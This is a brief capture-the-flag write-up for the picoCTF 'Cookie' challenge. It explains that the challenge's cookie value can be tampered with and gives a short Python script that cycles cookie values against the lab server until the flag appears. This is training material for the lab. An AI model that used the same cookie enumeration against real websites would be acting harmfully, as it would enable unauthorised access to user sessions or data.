# Cookie
## Description

Who doesn't love cookies? 
Try to figure out the best one. [http://mercury.picoctf.net:21485/](http://mercury.picoctf.net:21485/)

## Info

Wee have cookie in browser, when you change the value `0` to `1` the name of cookie change.

## Exploit
Try all number and find the best one

## Script
```python
import requests


for id_cookie in range(17, 19):
    cookie_payload = {"name": f"{id_cookie}"}
    response = requests.get(
        "http://mercury.picoctf.net:21485/check", cookies=cookie_payload)

    if "picoCTF{" in response.text:
        print(response.text)
        print(response.text[response.text.find(
            "<code>") + len("<code>"): response.text.find("</code>")])
```
